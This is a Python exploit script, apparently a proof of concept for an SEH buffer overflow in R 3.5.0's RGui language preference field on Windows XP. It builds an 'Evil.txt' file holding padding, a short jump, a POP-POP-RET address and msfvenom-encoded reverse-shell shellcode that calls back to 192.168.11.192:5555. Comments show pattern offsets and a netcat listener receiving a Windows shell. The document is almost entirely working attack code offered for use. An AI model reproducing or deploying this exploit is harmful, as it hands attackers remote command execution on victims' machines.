#!/usr/bin/python
#EDIT > RGUI PREFERENCE > COPY INTO LANGUAFE FOR MENUS AND MESSAGE TEXT BOX TO CRASH
#root@kali:~/Desktop# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1144
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\R\R-3.5.0\bin\i386>
#

#root@kali:~/Desktop# /usr/bin/msf-pattern_offset -q 6A41376A
#[*] Exact match at offset 292
#root@kali:~/Desktop# /usr/bin/msf-pattern_offset -q 42366442
#[*] Exact match at offset 888

#root@kali:~/Desktop# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -e x86/alpha_mixed -f python
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 710 (iteration=0)
#x86/alpha_mixed chosen with final size 710
#Payload size: 710 bytes
#Final size of python file: 3400 bytes
buf =  ""
buf += "\x89\xe1\xdb\xd1\xd9\x71\xf4\x5d\x55\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x68\x68\x4c"
buf += "\x42\x33\x30\x45\x50\x77\x70\x31\x70\x4e\x69\x49\x75"
buf += "\x50\x31\x6b\x70\x32\x44\x6c\x4b\x32\x70\x36\x50\x4c"
buf += "\x4b\x52\x72\x56\x6c\x6e\x6b\x63\x62\x36\x74\x6c\x4b"
buf += "\x73\x42\x55\x78\x76\x6f\x68\x37\x43\x7a\x44\x66\x46"
buf += "\x51\x49\x6f\x6c\x6c\x35\x6c\x30\x61\x73\x4c\x57\x72"
buf += "\x64\x6c\x71\x30\x59\x51\x78\x4f\x76\x6d\x43\x31\x68"
buf += "\x47\x79\x72\x69\x62\x50\x52\x50\x57\x4e\x6b\x50\x52"
buf += "\x66\x70\x4c\x4b\x42\x6a\x67\x4c\x6e\x6b\x62\x6c\x42"
buf += "\x31\x32\x58\x7a\x43\x32\x68\x45\x51\x78\x51\x72\x71"
buf += "\x6e\x6b\x42\x79\x75\x70\x46\x61\x39\x43\x6c\x4b\x52"
buf += "\x69\x62\x38\x7a\x43\x37\x4a\x77\x39\x4c\x4b\x76\x54"
buf += "\x4e\x6b\x77\x71\x7a\x76\x36\x51\x49\x6f\x6c\x6c\x6f"
buf += "\x31\x4a\x6f\x76\x6d\x56\x61\x59\x57\x66\x58\x59\x70"
buf += "\x33\x45\x4a\x56\x77\x73\x43\x4d\x48\x78\x45\x6b\x61"
buf += "\x6d\x64\x64\x73\x45\x4a\x44\x70\x58\x4c\x4b\x31\x48"
buf += "\x31\x34\x63\x31\x68\x53\x31\x76\x6e\x6b\x46\x6c\x50"
buf += "\x4b\x6c\x4b\x62\x78\x57\x6c\x56\x61\x38\x53\x4c\x4b"
buf += "\x34\x44\x4c\x4b\x63\x31\x38\x50\x4e\x69\x42\x64\x55"
buf += "\x74\x71\x34\x71\x4b\x73\x6b\x61\x71\x61\x49\x70\x5a"
buf += "\x73\x61\x4b\x4f\x6b\x50\x33\x6f\x33\x6f\x72\x7a\x6c"
buf += "\x4b\x64\x52\x6a\x4b\x6c\x4d\x63\x6d\x55\x38\x54\x73"
buf += "\x57\x42\x47\x70\x77\x70\x55\x38\x70\x77\x43\x43\x77"
buf += "\x42\x53\x6f\x32\x74\x33\x58\x72\x6c\x51\x67\x54\x66"
buf += "\x56\x67\x6b\x4f\x68\x55\x6d\x68\x4a\x30\x56\x61\x35"
buf += "\x50\x63\x30\x57\x59\x4f\x34\x71\x44\x42\x70\x75\x38"
buf += "\x77\x59\x4d\x50\x30\x6b\x43\x30\x69\x6f\x5a\x75\x72"
buf += "\x70\x56\x30\x56\x30\x56\x30\x51\x50\x36\x30\x47\x30"
buf += "\x52\x70\x70\x68\x69\x7a\x36\x6f\x79\x4f\x69\x70\x59"
buf += "\x6f\x4b\x65\x4f\x67\x70\x6a\x64\x45\x33\x58\x69\x50"
buf += "\x4d\x78\x76\x6b\x49\x50\x31\x78\x57\x72\x77\x70\x65"
buf += "\x45\x4c\x73\x4d\x59\x5a\x46\x72\x4a\x56\x70\x42\x76"
buf += "\x63\x67\x72\x48\x4f\x69\x39\x35\x30\x74\x51\x71\x69"
buf += "\x6f\x6b\x65\x6f\x75\x59\x50\x44\x34\x66\x6c\x6b\x4f"
buf += "\x42\x6e\x67\x78\x73\x45\x4a\x4c\x32\x48\x7a\x50\x78"
buf += "\x35\x59\x32\x71\x46\x59\x6f\x6b\x65\x52\x48\x71\x73"
buf += "\x42\x4d\x35\x34\x33\x30\x4b\x39\x6a\x43\x30\x57\x72"
buf += "\x77\x63\x67\x46\x51\x7a\x56\x50\x6a\x32\x32\x51\x49"
buf += "\x46\x36\x48\x62\x6b\x4d\x73\x56\x38\x47\x53\x74\x75"
buf += "\x74\x67\x4c\x47\x71\x37\x71\x4c\x4d\x57\x34\x46\x44"
buf += "\x62\x30\x49\x56\x43\x30\x31\x54\x70\x54\x62\x70\x51"
buf += "\x46\x33\x66\x61\x46\x50\x46\x33\x66\x50\x4e\x63\x66"
buf += "\x73\x66\x32\x73\x33\x66\x35\x38\x31\x69\x78\x4c\x47"
buf += "\x4f\x6e\x66\x6b\x4f\x7a\x75\x6c\x49\x79\x70\x42\x6e"
buf += "\x50\x56\x51\x56\x79\x6f\x70\x30\x31\x78\x54\x48\x4b"
buf += "\x37\x65\x4d\x65\x30\x39\x6f\x6b\x65\x4f\x4b\x68\x70"
buf += "\x48\x35\x79\x32\x73\x66\x75\x38\x4d\x76\x4a\x35\x4d"
buf += "\x6d\x6f\x6d\x79\x6f\x38\x55\x65\x6c\x64\x46\x53\x4c"
buf += "\x36\x6a\x6b\x30\x79\x6b\x39\x70\x64\x35\x47\x75\x6d"
buf += "\x6b\x52\x67\x75\x43\x30\x72\x62\x4f\x31\x7a\x55\x50"
buf += "\x36\x33\x69\x6f\x4a\x75\x41\x41"


#6BEC12C8   5F               POP EDI
#6BEC12C9   5D               POP EBP
#6BEC12CA   C3               RETN

payload ="WWYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLZHE2KPKPM01PDI9UP1Y0S44KB0P04K22LLTKB2N4TK2RO8LOH7PJMVNQKO6LOL31CLLBNLO0Y1XOLMM18G9RJRQB27DKR2LPTK0JOL4K0LLQ2XISPHM1J121TKB9O0M1YC4KOYMHJCNZ0IDKP4TKM19FP1KOFL7Q8OLMM1WWNXIPD5JVM33ML8OK3MO42UJDR8DKQHMTKQHSBFTKLLPKTK28MLM1J34KM44KM1Z0CY0DO4MTQK1KC1290ZB1KOK01OQO0ZDKMBJKTM1M38OC02M0KPRHCG2SP21OB4S8PL3GO6LGKO9EWHTPM1M0M0O9I4QD0PBHMYU0BKM0KO9E0P0PR0B0Q0B010R0RHZJLOYOYPKOZ5UG2JKU2HY0UXLKI038LBM0LUGCCY9VBJLP0V1G2H5I6ERTQQKOYEE5WPCDLLKOPNM8BUJLBHL0FU7226KOZ5QXS3BMRDM03YZC27PWPWNQZVBJN21IQFYRKMQVWW0DO4OLM1M1TM0DO4LPXFKP14B4B0PVB626Q6260N261F2326RH2YHLOO3VKOXU3Y9P0NB6PFKO00RHKX57MM1PKOIEWKZPVU5RQF38VFV57MEMKOIEOLKVSLLJSPKKYPBUKU7K17LSSBBORJM01CKOXUAA"
buffer = "A" * (884) + "\xEB\x06\xEB\x04" +  "\xC8\x12\xEC\x6B" + buf  + "D"*(6000-884-4-4)
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

